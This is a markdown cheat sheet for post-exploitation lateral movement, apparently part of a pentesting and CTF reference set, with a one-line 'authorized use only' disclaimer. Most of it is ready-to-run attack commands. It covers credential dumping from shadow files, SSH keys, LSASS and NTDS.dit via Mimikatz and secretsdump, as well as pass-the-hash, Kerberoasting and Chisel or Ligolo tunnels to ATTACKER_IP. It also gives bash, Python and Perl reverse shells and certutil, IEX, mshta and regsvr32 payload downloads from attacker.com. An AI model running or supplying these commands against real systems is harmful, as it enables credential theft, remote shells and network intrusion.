# Lateral Movement (Post-Exploitation Pivoting & Credential Abuse)

> For authorized security testing, CTF competitions, and educational purposes only.

Moving through a network after initial compromise. Covers credential harvesting,
pass-the-hash, Kerberos attacks, tunneling, and living-off-the-land techniques.

---

## Credential Harvesting

### Linux Credential Sources

```bash
# /etc/shadow — password hashes (requires root)
cat /etc/shadow
# Format: username:$id$salt$hash:...
# $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $y$ = yescrypt

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
cat /home/*/.ssh/id_rsa

# Bash history — may contain passwords
cat /home/*/.bash_history
cat /root/.bash_history
grep -i "pass\|password\|secret\|key\|token" /home/*/.bash_history 2>/dev/null

# Environment variables
env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# Configuration files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | head -50
grep -ri "password\|passwd\|pass=" /etc/ 2>/dev/null
grep -ri "password\|passwd\|pass=" /opt/ /var/www/ 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null     # WordPress
cat /var/www/html/.env 2>/dev/null               # Laravel/generic
cat /var/www/html/config/database.yml 2>/dev/null  # Rails

# Cached Kerberos tickets (Linux domain-joined)
klist
find / -name "krb5cc_*" 2>/dev/null
```

### Windows Credential Dumping

```powershell
# Mimikatz — extract passwords from memory
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords     # plaintext passwords, NTLM hashes, Kerberos tickets
sekurlsa::wdigest            # WDigest plaintext (if enabled)
lsadump::sam                 # SAM database hashes
lsadump::dcsync /user:DOMAIN\krbtgt  # DCSync attack (Domain Admin required)
lsadump::lsa /patch          # LSA secrets

# Dump LSASS process
# Task Manager: right-click lsass.exe -> Create dump file
# Or with procdump:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Offline extraction with mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# SharpDump (C# LSASS dumper)
.\SharpDump.exe

# Rubeus — Kerberos ticket extraction
.\Rubeus.exe dump          # dump all tickets
.\Rubeus.exe triage        # show ticket info

# SAM/SYSTEM registry extraction
reg save hklm\sam sam
reg save hklm\system system
reg save hklm\security security
# Extract with secretsdump:
secretsdump.py -sam sam -system system -security security LOCAL

# NTDS.dit (Domain Controller)
# Volume Shadow Copy method:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
# Extract with secretsdump:
secretsdump.py -ntds ntds.dit -system system LOCAL
```

---

## Pass-the-Hash / Pass-the-Ticket

### Pass-the-Hash (PtH)

```bash
# Impacket — psexec with NTLM hash (no password needed)
psexec.py DOMAIN/user@10.0.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
wmiexec.py DOMAIN/user@10.0.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
smbexec.py DOMAIN/user@10.0.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
atexec.py DOMAIN/user@10.0.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH "whoami"

# Evil-WinRM with hash
evil-winrm -i 10.0.0.5 -u administrator -H NTLM_HASH

# CrackMapExec — PtH across multiple hosts
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH --exec-method smbexec -x "whoami"
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH --sam  # dump SAM on each host

# xfreerdp with hash (RDP restricted admin mode)
xfreerdp /v:10.0.0.5 /u:administrator /pth:NTLM_HASH
```

### Kerberoasting

```bash
# Request TGS tickets for service accounts (any domain user can do this)
# Impacket
GetUserSPNs.py DOMAIN/user:password@DC_IP -request -outputfile kerberoast.txt

# Rubeus (from Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack the tickets offline
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### AS-REP Roasting

```bash
# Find accounts with "Do not require Kerberos preauthentication"
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile asrep.txt

# Rubeus (from Windows)
.\Rubeus.exe asreproast /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Ticket (PtT)

```powershell
# Export tickets with mimikatz
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Verify
klist

# Access resources with the imported ticket
dir \\server\share
```

---

## Pivoting & Port Forwarding

### SSH Tunnels

```bash
# Local port forward — access remote_target:3306 via localhost:3306
ssh -L 3306:remote_target:3306 user@pivot_host

# Remote port forward — expose your port 4444 on pivot_host:4444
ssh -R 4444:127.0.0.1:4444 user@pivot_host

# Dynamic SOCKS proxy — route all traffic through pivot
ssh -D 1080 user@pivot_host
# Then configure proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.0.0/24

# SSH over SSH (double pivot)
ssh -J user@pivot1 user@pivot2

# Persistent tunnel in background
ssh -f -N -L 3306:internal:3306 user@pivot_host
```

### Chisel

```bash
# On attacker (server mode)
./chisel server --reverse --port 8000

# On target (client) — reverse SOCKS proxy
./chisel client ATTACKER_IP:8000 R:socks

# On target — reverse port forward
./chisel client ATTACKER_IP:8000 R:8888:127.0.0.1:80

# On target — forward local port
./chisel client ATTACKER_IP:8000 1080:socks
```

### Ligolo-ng

```bash
# On attacker — start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On target — connect agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy interface:
session           # select session
start             # start tunnel
# Add route for internal network:
sudo ip route add 10.10.0.0/24 dev ligolo

# Now scan/access internal network directly
nmap -sT -Pn 10.10.0.1
```

### Other Tunneling Tools

```bash
# socat — port forwarding
# On pivot: forward incoming 8080 to internal target 80
socat TCP-LISTEN:8080,fork TCP:10.10.0.5:80

# plink (PuTTY CLI) — Windows SSH tunneling
plink.exe -ssh -L 3306:10.10.0.5:3306 user@pivot_host -pw password

# netsh — Windows native port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.0.5
netsh interface portproxy show all

# sshuttle — VPN-like access over SSH (Linux attacker only)
sshuttle -r user@pivot_host 10.10.0.0/24
```

---

## Living Off the Land (LOLBins / GTFOBins)

### Linux (GTFOBins)

```bash
# File download without curl/wget
# Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/shell', '/tmp/shell')"

# Perl
perl -e 'use LWP::Simple; getstore("http://attacker.com/shell", "/tmp/shell");'

# Netcat file transfer
# Receiver: nc -lvp 4444 > file
# Sender:   nc ATTACKER_IP 4444 < file

# Bash /dev/tcp
cat < /dev/tcp/attacker.com/80 > /tmp/file

# Reverse shells without obvious tools
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Windows (LOLBins)

```powershell
# Download files
certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe
bitsadmin /transfer job /download /priority high http://attacker.com/shell.exe C:\temp\shell.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/shell.exe','C:\temp\shell.exe')"
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Execute code
mshta http://attacker.com/payload.hta
rundll32 \\attacker.com\share\payload.dll,EntryPoint
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(gc script.ps1 -Raw)"

# WMI remote execution
wmic /node:10.0.0.5 /user:DOMAIN\admin /password:Pass123 process call create "cmd /c whoami > C:\temp\out.txt"

# PsExec (Sysinternals)
psexec \\10.0.0.5 -u DOMAIN\admin -p Pass123 cmd.exe
psexec \\10.0.0.5 -u DOMAIN\admin -p Pass123 -s cmd.exe  # as SYSTEM

# WinRM
winrs -r:10.0.0.5 -u:DOMAIN\admin -p:Pass123 "cmd /c whoami"
```

---

## Tips

- Always try credential reuse -- admins often reuse passwords across systems
- CrackMapExec is your best friend for testing creds across a network at scale
- Use SOCKS proxies (chisel, SSH -D) with proxychains for scanning internal networks
- Ligolo-ng gives a cleaner experience than traditional tunnels for large internal networks
- Kerberoasting is almost always possible if you have any domain user account
- Check for GPP passwords in SYSVOL: `\\DC\SYSVOL\domain\Policies\*.xml`
- Avoid noisy tools on production networks; prefer WMI/WinRM over PsExec
- Use SSH keys whenever possible -- no password to type or log
- Keep your tunnels organized; label them so you know what connects where

---

## See Also

- privilege-escalation
- password-attacks
- metasploit
- recon
- ssh-tunneling
- socat

## References

- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Impacket](https://github.com/fortra/impacket)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [CrackMapExec](https://github.com/Pennyw0rth/NetExec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [HackTricks Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
